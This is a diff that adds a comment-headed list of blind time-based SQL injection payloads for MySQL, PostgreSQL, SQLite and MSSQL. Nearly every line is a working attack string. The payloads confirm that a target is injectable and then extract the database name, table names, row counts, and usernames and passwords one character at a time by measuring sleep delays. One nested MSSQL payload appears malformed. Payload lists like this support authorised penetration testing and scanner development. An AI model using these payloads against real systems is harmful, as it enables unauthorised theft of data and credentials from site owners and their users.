@@ -1,0 +1,54 @@
+# ============================================================
+# SQL Injection Payloads - Blind Time-Based
+# ============================================================
+# Target: When there is NO visible difference between true/false
+#   responses. Infer data by measuring response time.
+#
+# Technique: Inject IF(condition, SLEEP(N), 0) and measure
+#   whether the response is delayed.
+# ============================================================
+
+# --- Confirm injectable ---
+# MySQL
+' AND SLEEP(5) --
+' OR SLEEP(5) --
+' AND IF(1=1,SLEEP(5),0) --
+' AND IF(1=2,SLEEP(5),0) --
+
+# PostgreSQL
+'; SELECT pg_sleep(5) --
+' AND 1=(SELECT CASE WHEN (1=1) THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END) --
+
+# SQLite (uses heavy computation instead of sleep)
+' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) --
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5' --
+' AND 1=(SELECT CASE WHEN (1=1) THEN (SELECT 1 WHERE 1=(SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:5') AS t)) ELSE 1 END) --
+
+# --- Extract database name char by char (MySQL) ---
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --
+' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0) --
+' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(5),0) --
+' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0) --
+
+# --- Extract table names (MySQL) ---
+' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u',SLEEP(5),0) --
+
+# --- Extract data (MySQL) ---
+' AND IF(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='a',SLEEP(5),0) --
+' AND IF(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='p',SLEEP(5),0) --
+
+# --- Row count (MySQL) ---
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0) --
+' AND IF((SELECT COUNT(*) FROM users)>5,SLEEP(5),0) --
+
+# --- PostgreSQL data extraction ---
+' AND 1=(SELECT CASE WHEN SUBSTRING(current_database(),1,1)='p' THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END) --
+
+# --- MSSQL data extraction ---
+'; IF(SUBSTRING(DB_NAME(),1,1)='t') WAITFOR DELAY '0:0:5' --
+
+# --- Numeric context ---
+1 AND IF(1=1,SLEEP(5),0)
+1 AND IF(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='a',SLEEP(5),0)
